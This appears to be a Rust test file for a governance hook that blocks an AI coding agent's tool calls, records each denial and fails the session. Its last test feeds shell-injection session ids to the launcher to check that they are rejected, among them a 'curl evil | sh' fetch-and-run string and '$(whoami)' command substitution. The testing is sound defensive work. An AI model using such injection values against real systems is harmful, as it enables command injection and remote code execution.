//! core#24 — GOVERNANCE-IN-RUN keystone (DES-OUTGOV-003).
//!
//! Two halves prove the milestone deterministically (no real `claude`):
//!  1. `real_gate_hook_denies_a_tripping_tool_call_and_records_it` — the REAL `wicked-core gate-hook`
//!     binary (what claude spawns per PreToolUse) denies a tool-call that trips a seeded deny policy
//!     (exit 2) AND appends the `Deny` to the decisions log. (the hook half: select→decide→append→exit2)
//!  2. `a_denied_tool_call_fails_the_session` — a GOVERNED run whose worker records a `Deny` in the run's
//!     decisions log (what half 1 produces) drives the **session to `Failed`** through the engine's own
//!     per-unit deny-dominant gate. (the fold half — the corrected design's whole point)

use std::io::Write;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};

use wicked_apps_core::{open_store, ConformanceClaim, Decision};
use wicked_core::{
    decisions_path_for, gov_run_dir, Core, EntityMode, HumanConfirm, LaunchSpec, SessionStatus,
    StepInput, StepOutput, StepRunner, StepStatus,
};
use wicked_council::types::{Category, Confidence, Dispatcher, InputMode, Vote};
use wicked_council::{AgenticCli, CouncilTask};
use wicked_governance::{register_policy, Effect, Policy, Severity, Trigger};

const BIN: &str = env!("CARGO_BIN_EXE_wicked-core");

fn scratch(name: &str) -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("wc-govrun-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

/// A hard-DENY policy selected for `phase` that fires whenever the context contains `DENYME`.
fn deny_policy(phase: &str) -> Policy {
    Policy {
        id: "pol-deny-denyme".into(),
        kind: "policy".into(),
        applies_to: vec![phase.to_string()],
        effect: Effect::Deny,
        trigger: Trigger {
            contains: Some("DENYME".into()),
        },
        obligations: vec![],
        criteria: "no DENYME in a tool-call".into(),
        severity: Severity::High,
        rule: "tool-calls containing DENYME are denied".into(),
    }
}

#[test]
fn real_gate_hook_denies_a_tripping_tool_call_and_records_it() {
    let dir = scratch("hook");
    let db = dir.join("estate.db");
    let db_s = db.to_str().unwrap().to_string();
    {
        let mut store = open_store(Some(&db_s)).unwrap();
        register_policy(&mut store, &deny_policy("unit-1")).unwrap();
    }
    let decisions = dir.join("decisions.ndjson");
    // A tool-call that trips the deny policy (its `command` contains DENYME).
    let tool_call = r#"{"tool_name":"Bash","tool_input":{"command":"echo DENYME"}}"#;

    let mut child = Command::new(BIN)
        .args([
            "gate-hook",
            "--scope",
            "wicked-agent/r/unit/s:u1",
            "--phase",
            "unit-1",
        ])
        // The launcher supplies the store path via env (the injected command drops --db).
        .env("WICKED_ESTATE_DB", &db_s)
        .env("WICKED_DECISIONS_PATH", &decisions)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("spawn gate-hook");
    child
        .stdin
        .take()
        .unwrap()
        .write_all(tool_call.as_bytes())
        .unwrap();
    let status = child.wait().unwrap();
    assert_eq!(
        status.code(),
        Some(2),
        "a tripping tool-call is DENIED with exit 2 (claude aborts the call)"
    );
    let log = std::fs::read_to_string(&decisions).expect("decisions log written");
    let claim: ConformanceClaim = log
        .lines()
        .filter_map(|l| serde_json::from_str(l.trim()).ok())
        .next()
        .expect("a claim was appended");
    assert_eq!(
        claim.decision,
        Decision::Deny,
        "the recorded claim is a Deny"
    );
    assert_eq!(claim.phase, "unit-1", "recorded at the unit's real phase");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn gate_hook_via_env_db_resolves_without_an_explicit_db_flag() {
    // The injected command drops `--db`; the subcommand must fall back to WICKED_ESTATE_DB (finding #6).
    let dir = scratch("envdb");
    let db = dir.join("estate.db");
    let db_s = db.to_str().unwrap().to_string();
    open_store(Some(&db_s)).unwrap(); // create the store (no policies ⇒ Allow)
    let decisions = dir.join("decisions.ndjson");
    let mut child = Command::new(BIN)
        .args(["gate-hook", "--scope", "s", "--phase", "unit-1"])
        .env("WICKED_ESTATE_DB", &db_s)
        .env("WICKED_DECISIONS_PATH", &decisions)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("spawn");
    child
        .stdin
        .take()
        .unwrap()
        .write_all(br#"{"tool_name":"Read","tool_input":{"file_path":"/x"}}"#)
        .unwrap();
    assert_eq!(
        child.wait().unwrap().code(),
        Some(0),
        "no policy matches ⇒ ALLOW (exit 0); the store resolved from WICKED_ESTATE_DB, not a garbage file"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

// ── the keystone: a recorded Deny fails the SESSION ──────────────────────────────────────────────────

/// A runner that simulates the PreToolUse gate-hook having fired during the CLI run: for a GOVERNED unit
/// it appends a `Deny` claim to the run's decisions log at the unit's REAL phase (exactly what
/// `wicked-core gate-hook` appends when a tool-call trips a deny policy), then returns normal output.
struct HookDenyRunner;
impl StepRunner for HookDenyRunner {
    fn run_unit(&self, i: &StepInput) -> StepOutput {
        // A real campaign unit on a file-backed store MUST be governed (input governance armed).
        assert!(
            i.governance.is_some(),
            "a campaign unit on a file db must carry a governance context (opt-in armed)"
        );
        let phase = format!("unit-{}", i.unit.ord);
        let claim = ConformanceClaim {
            claim_id: format!("hookdeny-{}", i.unit.ord),
            scope: "wicked-agent/gov-fail/unit/x".into(),
            phase: phase.clone(),
            policy_ids: vec!["pol-deny-denyme".into()],
            decision: Decision::Deny,
            obligations: vec![],
            evaluated_context_ref: "sha256:test".into(),
            criteria: "no DENYME".into(),
            evaluator_identity: "wicked-governance".into(),
            evaluated_at: 1_750_000_000,
        };
        let path = decisions_path_for(&i.run_id, i.attempt);
        if let Some(p) = path.parent() {
            let _ = std::fs::create_dir_all(p);
        }
        let mut line = serde_json::to_string(&claim).unwrap();
        line.push('\n');
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
            .unwrap();
        f.write_all(line.as_bytes()).unwrap();

        StepOutput {
            run_id: i.run_id.clone(),
            unit_ix: i.unit_ix,
            attempt: i.attempt,
            output: "did the work".into(),
            status: StepStatus::Ok, // the CLI itself SUCCEEDS — only governance denies
            usage: None,
            files: Vec::new(),
            governed: false,
        }
    }
}

struct FixedDispatcher;
impl Dispatcher for FixedDispatcher {
    fn dispatch(&self, cli: &AgenticCli, _t: &CouncilTask) -> Option<Vote> {
        Some(Vote {
            cli: cli.key.clone(),
            recommendation: "a".into(),
            top_risk: "none".into(),
            change_my_mind: "no".into(),
            disqualifier: None,
            confidence: Confidence::default(),
            provenance: "fixed".into(),
        })
    }
}

fn cli(key: &str) -> AgenticCli {
    AgenticCli {
        key: key.into(),
        display_name: key.into(),
        binary: "unused".into(),
        headless_invocation: "unused {PROMPT}".into(),
        category: Category::default(),
        input_mode: InputMode::default(),
        version_probe: vec![],
        trust_flags: vec![],
        alt_binaries: vec![],
        confidence: Confidence::default(),
        enabled_for_council: true,
        acp: None,
    }
}

fn wait_terminal(core: &Core, run_id: &str) -> Option<SessionStatus> {
    let deadline = Instant::now() + Duration::from_secs(6);
    while Instant::now() < deadline {
        if let Ok(v) = core.sessions_detail() {
            if let Some(s) = v.iter().find(|s| s.session.id == run_id) {
                if matches!(
                    s.session.status,
                    SessionStatus::Completed | SessionStatus::Failed | SessionStatus::Cancelled
                ) {
                    return Some(s.session.status);
                }
            }
        }
        std::thread::sleep(Duration::from_millis(15));
    }
    None
}

#[test]
fn a_denied_tool_call_fails_the_session() {
    let dir = scratch("keystone");
    let db = dir.join("estate.db");
    // Clean any stale governance dir for this run id (launch_run_inner also clears it on a fresh launch).
    let _ = std::fs::remove_dir_all(gov_run_dir("gov-fail"));

    let core = Core::spawn_with_engine(
        db.to_str().unwrap().to_string(),
        Arc::new(FixedDispatcher),
        Arc::new(HookDenyRunner),
    );
    core.launch_run(LaunchSpec {
        problem: "Build the thing".into(),
        clis: vec![cli("a"), cli("b")],
        entity_mode: EntityMode::Isolated,
        session_id: "gov-fail".into(),
        human_confirm: HumanConfirm::None,
        repo_ref: None,
        workflow: None,
    })
    .unwrap();

    let status = wait_terminal(&core, "gov-fail");
    assert_eq!(
        status,
        Some(SessionStatus::Failed),
        "a governance-denied tool-call drives the SESSION to Failed (not a silent Completed): {status:?}"
    );
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(gov_run_dir("gov-fail"));
}

#[test]
fn a_shell_hostile_session_id_is_rejected_at_launch() {
    // Defense-in-depth: even though scope/phase now ride env (not the shell hook command), a session id
    // carrying shell metacharacters is rejected at ingress — it is never a legitimate run id.
    let dir = scratch("hostile");
    let db = dir.join("estate.db");
    let core = Core::spawn_with_engine(
        db.to_str().unwrap().to_string(),
        Arc::new(FixedDispatcher),
        Arc::new(HookDenyRunner),
    );
    for hostile in [
        "x\" ; curl evil | sh ; \"",
        "$(whoami)",
        "a`id`b",
        "a;b",
        "a|b",
    ] {
        let res = core.launch_run(LaunchSpec {
            problem: "Build the thing".into(),
            clis: vec![cli("a")],
            entity_mode: EntityMode::Isolated,
            session_id: hostile.into(),
            human_confirm: HumanConfirm::None,
            repo_ref: None,
            workflow: None,
        });
        assert!(
            res.is_err(),
            "a shell-hostile session id must be rejected at launch: {hostile:?} → {res:?}"
        );
    }
    let _ = std::fs::remove_dir_all(&dir);
}
